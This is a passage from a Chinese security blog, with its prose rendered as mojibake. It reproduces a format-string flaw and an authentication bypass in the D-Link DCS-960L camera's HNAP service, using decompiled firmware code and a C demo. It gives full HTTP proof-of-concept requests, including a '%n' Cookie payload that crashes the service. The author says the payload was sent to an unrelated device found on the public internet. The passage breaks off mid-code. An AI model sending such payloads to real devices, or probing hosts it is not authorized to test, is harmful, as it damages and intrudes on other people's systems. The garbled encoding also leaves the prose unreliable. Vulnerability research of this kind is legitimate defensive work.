<p><a class="link"   href="https://blog.csdn.net/star19830909/article/details/88235535" >Linux å¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf" >Infiltrating Corporate Intranet Like NSA<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Dlink DCS-960L æ¼æ´å¤ç°</title>
    <url>/2021/01/17/DCS-960L/</url>
    <content><![CDATA[<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»¥åŠèº«ä»½éªŒè¯ç»•è¿‡</p>
<p><strong>Dlink å®˜æ–¹å®£å¸ƒè¯¥è®¾å¤‡å·²ç»è¿›å…¥ EOS (End Of Sale) é˜¶æ®µï¼Œå»ºè®®ç”¨æˆ·åŠæ—¶ä¸‹çº¿å¹¶æ›¿æ¢æ­¤è®¾å¤‡ã€‚</strong></p>
<span id="more"></span>

<h2 id="HNAP-Cookie-Format-String"><a href="#HNAP-Cookie-Format-String" class="headerlink" title="HNAP Cookie Format String"></a>HNAP Cookie Format String</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>æŠ«éœ²ä¿¡æ¯ï¼š<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1435/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1435/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ZDI ç¼–å·ï¼šZDI-CAN-11360</p>
<p>æ¼æ´è¯„åˆ†ï¼š8.8(<strong>High</strong>)</p>
<p>æ¼æ´æè¿°ï¼šDCS-960L åœ¨å¤„ç†è¯·æ±‚ä¸­çš„ Cookie å­—æ®µæ—¶ï¼Œé”™è¯¯çš„å°†ç”¨æˆ·æäº¤çš„æ•°æ®ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šæ ¼å¼çš„ Cookie è§¦å‘æ­¤æ¼æ´ï¼Œä¸¥é‡å¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å…ˆå»å®˜ç½‘ä¸‹è½½å›ºä»¶(1.09)ï¼Œé“¾æ¥ï¼š<a class="link"   href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617" >http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>å›ºä»¶æ²¡æœ‰ç»è¿‡ç‰¹æ®Šå¤„ç†ï¼Œç›´æ¥ binwalk å¯ä»¥è§£å¼€ï¼Œå¾—åˆ°ä¸€ä¸ª Linux æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ‘ä»¬è¦åˆ†æçš„ç›®æ ‡æ–‡ä»¶æ˜¯ &#x2F;web&#x2F;cgi-bin&#x2F;hnap&#x2F;hnap_serviceã€‚</p>
<p>æ–‡ä»¶æ¶æ„ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped</span><br></pre></td></tr></table></figure></div>

<p>ç›´æ¥ç”¨ IDA åŠ è½½åˆ†æï¼Œæ ¹æ®æŠ«éœ²ä¿¡æ¯æ¥çœ‹ï¼Œé—®é¢˜å‡ºç°åœ¨å¤„ç†å¸¦æœ‰ Cookie çš„ HNAP è¯·æ±‚æ—¶ï¼Œæœç´¢å­—ç¬¦ä¸² Cookie å¹¶æŸ¥æ‰¾äº¤å‰å¼•ç”¨å¯ä»¥å‘ç°åä¸º Login çš„å‡½æ•°ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v7 = getenv(<span class="string">&quot;COOKIE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v7 &amp;&amp; *v7 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line">  v9 = getenv(<span class="string">&quot;COOKIE&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v45, <span class="number">0x80</span>u, <span class="string">&quot;%s&quot;</span>, v9);</span><br><span class="line">  v10 = <span class="built_in">strstr</span>(v45, <span class="string">&quot;uid=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v10 + <span class="number">4</span>;</span><br><span class="line">    v12 = <span class="built_in">strchr</span>(v10 + <span class="number">4</span>, <span class="number">59</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      *v12 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(v41, <span class="number">0xB</span>u, v11);</span><br><span class="line">    v13 = &amp;v58[<span class="number">9</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v41, <span class="number">0xB</span>u, v45);</span><br><span class="line">    v13 = &amp;v58[<span class="number">9</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆç”¨ getenv å‡½æ•°è·å–ä¼ å…¥çš„ Cookie å­—æ®µå€¼ï¼Œç„¶ååˆ¤æ–­å…¶ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸² â€œuid&#x3D;â€ï¼Œæ— è®ºä¼ å…¥çš„æ•°æ®ä¸­æ˜¯å¦åŒ…å«ï¼Œéƒ½ä¼šæŠŠæ•°æ®å¸¦å…¥å‡½æ•° snprintf æ‹·è´ç»™ç¼“å†²åŒº v41ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨å‡½æ•° snprintf çš„æ—¶å€™ç›´æ¥å°†ç”¨æˆ·å¯æ§çš„æ•°æ®ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œç”±äº snprintf çš„ç‰¹æ€§ï¼Œä¼šå¯¼è‡´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä»£ç æµ‹è¯•</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* cookie = <span class="string">&quot;is_cookie&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* mem = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>(mem, <span class="number">0xb</span>, <span class="string">&quot;%s&quot;</span>, cookie);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, mem);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* cookie2 = <span class="string">&quot;%p%p%p&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mem2 = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(mem2, <span class="number">0xb</span>, cookie2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, mem2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¼–è¯‘è¿è¡Œä¼šè¾“å‡ºä»¥ä¸‹ç»“æœ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_cookie</span><br><span class="line">0040802400</span><br><span class="line"></span><br><span class="line">Process returned 0 (0x0)   execution time : 0.024 s</span><br><span class="line">Press any key to continue.</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€æ¬¡æˆ‘ä»¬æ­£ç¡®çš„ä½¿ç”¨ snprintf å‡½æ•°ï¼Œæ‹·è´çš„ç»“æœæ²¡é—®é¢˜ï¼Œç¬¬äºŒæ¬¡ç›´æ¥æŠŠæºå­—ç¬¦ä¸²ä½œä¸º snprintf çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæºå­—ç¬¦ä¸²æ˜¯æ”»å‡»è€…ç²¾å¿ƒæ§åˆ¶çš„(ä¾‹å¦‚ä»£ç ä¸­æ¼”ç¤ºçš„)ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p><strong>æ³¨ï¼šè®¿é—®é“¾æ¥ &#x2F;hnap&#x2F;hnap_service å¯ä»¥è·å–åˆ°è®¾å¤‡çš„éƒ¨åˆ†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å‹å·å’Œå½“å‰å›ºä»¶ç‰ˆæœ¬ã€‚</strong></p>
<p>åœ¨å…¬ç½‘æ‰¾åˆ°æŸè®¾å¤‡è¿›è¡Œæµ‹è¯•ï¼Œå…ˆè·å–è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-1.png"
                     
                ></p>
<p>ç›®æ ‡è®¾å¤‡ä½¿ç”¨çš„å›ºä»¶ç‰ˆæœ¬æ˜¯ 1.09ï¼Œæ­£å¥½å’Œæˆ‘ä»¬åˆ†æçš„ç‰ˆæœ¬ä¸€è‡´ã€‚</p>
<p>ä¸‹é¢è¦æ„é€ ä¸€ä¸ªå¯ç”¨çš„ POCï¼Œç”±äºæ¼æ´ä½äºå¤„ç† HNAP è¯·æ±‚çš„é€»è¾‘ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå…¶ä»– Dlink è®¾å¤‡çš„ HNAP è¯·æ±‚ç…§æ¬è¿‡æ¥ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/Login&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Cookie: 36f0E73734</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;&lt;/Action&gt;&lt;Username&gt;&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>æµ‹è¯• POC</p>
<p>é¦–å…ˆä¼ å…¥ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚ï¼Œè®¾å¤‡å¯ä»¥è¿”å›å“åº”å†…å®¹ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-2.png"
                     
                ></p>
<p>æ¥ç€æ„é€ ä¸€ä¸ªå¸¦æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ Cookieï¼Œä¸ºäº†çœ‹åˆ°æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ %n è¿™ä¸ªå‚æ•°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/Login&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uid=%100x%n;</span><br><span class="line">Content-Length: 374</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>å‘é€è¿™ä¸ª POCï¼Œç”±äºè®¿é—®äº†éæ³•åœ°å€ï¼Œç¨‹åºä¼šç›´æ¥ç»“æŸï¼ŒæœåŠ¡ç«¯ä¸ä¼šè¿”å›ä»»ä½•å†…å®¹ã€‚</p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><h3 id="åŸºæœ¬ä¿¡æ¯-1"><a href="#åŸºæœ¬ä¿¡æ¯-1" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>æŠ«éœ²ä¿¡æ¯ï¼š<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1437/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1437/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ZDI ç¼–å·ï¼šZDI-CAN-11352</p>
<p>æ¼æ´è¯„åˆ†ï¼š8.8(<strong>High</strong>)</p>
<p>æ¼æ´æè¿°ï¼šDCS-960L åœ¨å¤„ç† HNAP ç™»å½•è¯·æ±‚æ—¶ï¼Œå¯¹äºå‚æ•° LoginPassword çš„å¤„ç†é€»è¾‘é”™è¯¯ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šçš„ç™»å½•è¯·æ±‚å®ç°ç™»å½•éªŒè¯ç»•è¿‡ã€‚</p>
<h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>éœ€è¦åˆ†æçš„ç›®æ ‡æ–‡ä»¶å’Œä¸Šä¸€ä¸ªæ¼æ´ç›¸åŒï¼Œåœ¨å‡½æ•° Login ä¸­å­˜åœ¨ä»¥ä¸‹ä»£ç ç‰‡æ®µ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v16 = ixmlGetElementValueByTag(v5, <span class="string">&quot;Username&quot;</span>);</span><br><span class="line">        login_password = ixmlGetElementValueByTag(v5, <span class="string">&quot;LoginPassword&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(username2, v16);</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(username2, <span class="string">&quot;Admin&quot;</span>) )</span><br><span class="line">            <span class="built_in">snprintf</span>(username2, <span class="number">0x20</span>u, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( login_password )</span><br><span class="line">          <span class="built_in">strcpy</span>(login_password2, login_password);</span><br><span class="line">        temp = username2;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;username: %s\n&quot;</span>, username2);</span><br><span class="line">        login_password3 = login_password2;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;loginPassword: %s\n&quot;</span>, login_password2);</span><br><span class="line">        key[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">        v57 = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        v53 = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        v55 = <span class="number">0</span>;</span><br><span class="line">        digest = <span class="number">0</span>;</span><br><span class="line">        v49 = <span class="number">0</span>;</span><br><span class="line">        v50 = <span class="number">0</span>;</span><br><span class="line">        v51 = <span class="number">0</span>;</span><br><span class="line">        usrInit(<span class="number">0</span>);</span><br><span class="line">        usrGetPass(temp, password, <span class="number">33</span>);         <span class="comment">// åˆ©ç”¨ç”¨æˆ·ååŒ¹é…å¯¹åº”çš„å¯†ç </span></span><br><span class="line">        usrFree();</span><br><span class="line">        public_key = maybe_public_key;</span><br><span class="line">        <span class="built_in">sprintf</span>(key, <span class="string">&quot;%s%s&quot;</span>, maybe_public_key, password);<span class="comment">// public_key + password</span></span><br><span class="line">        temp = &amp;maybe_public_key[<span class="number">4</span>] + <span class="number">4</span>;        <span class="comment">// challenge</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My challenge: %s\n&quot;</span>, &amp;maybe_public_key[<span class="number">4</span>] + <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My public_key: %s\n&quot;</span>, public_key);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My password: %s\n&quot;</span>, password);</span><br><span class="line">        text_len = <span class="built_in">strlen</span>(temp);                <span class="comment">// è·å– challenge çš„é•¿åº¦</span></span><br><span class="line">        key_len = <span class="built_in">strlen</span>(key);                  <span class="comment">// è·å– public_key + password çš„é•¿åº¦</span></span><br><span class="line">        hmac_md5(temp, text_len, key, key_len, &amp;digest);<span class="comment">// hmac_md5(challenge, challenge_len, public_key + password, key_len, digest)</span></span><br><span class="line">        <span class="built_in">sprintf</span>(private_key, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, digest, v49, v50, v51);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My private_key: %s\n&quot;</span>, private_key);</span><br><span class="line">        digest = <span class="number">0</span>;</span><br><span class="line">        v49 = <span class="number">0</span>;</span><br><span class="line">        v50 = <span class="number">0</span>;</span><br><span class="line">        v51 = <span class="number">0</span>;</span><br><span class="line">        public_key = <span class="built_in">strlen</span>(temp);              <span class="comment">// è·å– challenge é•¿åº¦</span></span><br><span class="line">        v20 = <span class="built_in">strlen</span>(private_key);              <span class="comment">// è·å– private_key é•¿åº¦</span></span><br><span class="line">        hmac_md5(temp, public_key, private_key, v20, &amp;digest);<span class="comment">// hmac_md5(challenge, challenge_len, private_key, private_key_len, digest)</span></span><br><span class="line">        <span class="built_in">sprintf</span>(v52, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, digest, v49, v50, v51);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My login_password: %s\n&quot;</span>, v52);</span><br><span class="line">        v21 = <span class="built_in">strcmp</span>(login_password3, v52) == <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Check authStatus: %d\n&quot;</span>, v21);</span><br><span class="line">        v22 = v2;</span><br><span class="line">        <span class="keyword">if</span> ( v21 )</span><br><span class="line">        &#123;</span><br><span class="line">          v23 = time(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( HIBYTE(maybe_public_key[<span class="number">1509</span>])</span><br><span class="line">            &amp;&amp; BYTE4(maybe_public_key[<span class="number">1513</span>])</span><br><span class="line">            &amp;&amp; v23 - LODWORD(maybe_public_key[<span class="number">1515</span>]) &lt; <span class="number">301</span></span><br><span class="line">            &amp;&amp; (v24 = &amp;maybe_public_key[<span class="number">1524</span>], v23 &gt;= SLODWORD(maybe_public_key[<span class="number">1515</span>])) )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = *(v24 + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !HIBYTE(maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1509</span>]) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !BYTE4(maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1513</span>]) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v27 = v23 - v26 &gt;= <span class="number">301</span>;</span><br><span class="line">              v28 = v23 &lt; v26;</span><br><span class="line">              <span class="keyword">if</span> ( v27 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              ++v25;</span><br><span class="line">              <span class="keyword">if</span> ( v28 )</span><br><span class="line">              &#123;</span><br><span class="line">                --v25;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              v24 += <span class="number">9</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v25 == <span class="number">1000</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                ixmlAppendNewElement(v2, v3, <span class="string">&quot;LoginResult&quot;</span>, <span class="string">&quot;failed&quot;</span>);</span><br><span class="line">                v15 = v2;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v25 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1509</span>], <span class="number">0x23</span>u, <span class="string">&quot;%s&quot;</span>, private_key);</span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1513</span>] + <span class="number">4</span>, <span class="number">0xB</span>u, <span class="string">&quot;%s&quot;</span>, v41);</span><br><span class="line">          v29 = &amp;username2[<span class="number">18</span> * v25];</span><br><span class="line">          *(v29 + <span class="number">1566</span>) = v23;</span><br><span class="line">          *(v29 + <span class="number">12544</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(username2, <span class="string">&quot;admin&quot;</span>) )</span><br><span class="line">            BYTE1(v36[<span class="number">9</span> * v25 + <span class="number">1572</span>]) = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            BYTE1(v36[<span class="number">9</span> * v25 + <span class="number">1572</span>]) = <span class="number">0</span>;</span><br><span class="line">          SIWriteBin(<span class="number">63</span>, maybe_public_key, <span class="number">84072</span>);</span><br><span class="line">          ixmlAppendNewElement(v2, v3, <span class="string">&quot;LoginResult&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">          v15 = v2;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆè·å–ç”¨æˆ·ä¼ å…¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ¥ç€åˆå§‹åŒ–äº†ä¸€äº›å˜é‡ï¼Œç„¶åè°ƒç”¨ usrInitã€usrGetPassã€usrFree ä¸‰ä¸ªå‡½æ•°ï¼Œå…¶ä¸­ usrGetPass å‡½æ•°ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">usrGetPass</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *username, <span class="type">char</span> *buffer, <span class="type">size_t</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+18h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*username )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  v7 = 